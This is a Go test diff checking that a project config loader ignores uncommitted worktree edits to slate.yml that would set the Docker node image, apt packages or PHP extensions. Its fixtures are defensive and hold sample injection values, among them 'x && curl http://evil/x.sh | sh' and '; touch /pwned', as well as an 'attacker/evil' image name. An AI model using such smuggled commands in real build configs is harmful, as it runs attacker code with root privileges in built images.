@@ -491,3 +491,106 @@ func TestAgentCmdUnmarshal(t *testing.T) {
 		t.Error("zero AgentCmd should report IsZero")
 	}
 }
+
+func TestString(t *testing.T) {
+	dir := t.TempDir()
+	yaml := `scaffold: laravel
+node_image: node:24
+app_scale: 3
+`
+	if err := os.WriteFile(filepath.Join(dir, "slate.yml"), []byte(yaml), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	cfg, err := LoadProject(dir)
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	if got := cfg.String("node_image"); got != "node:24" {
+		t.Errorf("node_image = %q, want node:24", got)
+	}
+	if got := cfg.String("app_scale"); got != "3" {
+		t.Errorf("app_scale = %q, want 3 (scalars stringify)", got)
+	}
+	if got := cfg.String("nonexistent"); got != "" {
+		t.Errorf("nonexistent = %q, want empty", got)
+	}
+}
+
+func TestNodeImageIsNotTakenFromTheWorktree(t *testing.T) {
+	mainRoot := t.TempDir()
+	gitRunCfg(t, mainRoot, "init", "-q", "-b", "main")
+	if err := os.WriteFile(filepath.Join(mainRoot, "slate.yml"), []byte("scaffold: laravel\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	gitRunCfg(t, mainRoot, "add", ".")
+	gitRunCfg(t, mainRoot, "commit", "-q", "-m", "init")
+
+	wsDir := filepath.Join(mainRoot, ".slate", "workspaces", "feat")
+	gitRunCfg(t, mainRoot, "worktree", "add", "-q", "-b", "slate/feat", wsDir)
+
+	// what a compromised dependency can do: rewrite the working copy
+	if err := os.WriteFile(filepath.Join(wsDir, "slate.yml"),
+		[]byte("scaffold: laravel\nnode_image: attacker/evil:latest\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	cfg, err := LoadProjectForWorkspace(mainRoot, wsDir)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if got := cfg.String("node_image"); got != "" {
+		t.Errorf("node_image = %q, want empty: an uncommitted worktree edit must not choose the image", got)
+	}
+	if pinned := TrustPinned(mainRoot, wsDir); !slices.Contains(pinned, "node_image") {
+		t.Errorf("TrustPinned = %v, want it to report node_image as inert", pinned)
+	}
+
+	// committed on the branch, it is host-authored and applies
+	gitRunCfg(t, wsDir, "add", "slate.yml")
+	gitRunCfg(t, wsDir, "commit", "-q", "-m", "pin node image")
+	cfg, err = LoadProjectForWorkspace(mainRoot, wsDir)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if got := cfg.String("node_image"); got != "attacker/evil:latest" {
+		t.Errorf("node_image = %q, want the branch-committed value", got)
+	}
+}
+
+func TestDockerfileContentKeysAreNotTakenFromTheWorktree(t *testing.T) {
+	mainRoot := t.TempDir()
+	gitRunCfg(t, mainRoot, "init", "-q", "-b", "main")
+	if err := os.WriteFile(filepath.Join(mainRoot, "slate.yml"), []byte("scaffold: laravel\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	gitRunCfg(t, mainRoot, "add", ".")
+	gitRunCfg(t, mainRoot, "commit", "-q", "-m", "init")
+
+	wsDir := filepath.Join(mainRoot, ".slate", "workspaces", "feat")
+	gitRunCfg(t, mainRoot, "worktree", "add", "-q", "-b", "slate/feat", wsDir)
+
+	// a compromised dependency rewrites the working copy to smuggle a root
+	// build step into the image
+	payload := "scaffold: laravel\n" +
+		"apt_packages: [\"x && curl http://evil/x.sh | sh\"]\n" +
+		"php_extensions: [\"; touch /pwned\"]\n"
+	if err := os.WriteFile(filepath.Join(wsDir, "slate.yml"), []byte(payload), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	cfg, err := LoadProjectForWorkspace(mainRoot, wsDir)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if pkgs := cfg.StringSlice("apt_packages"); len(pkgs) != 0 {
+		t.Errorf("apt_packages from the worktree must be ignored, got %v", pkgs)
+	}
+	if exts := cfg.StringSlice("php_extensions"); len(exts) != 0 {
+		t.Errorf("php_extensions from the worktree must be ignored, got %v", exts)
+	}
+	if pinned := TrustPinned(mainRoot, wsDir); !slices.Contains(pinned, "apt_packages") || !slices.Contains(pinned, "php_extensions") {
+		t.Errorf("TrustPinned = %v, want it to report apt_packages and php_extensions as inert", pinned)
+	}
+}
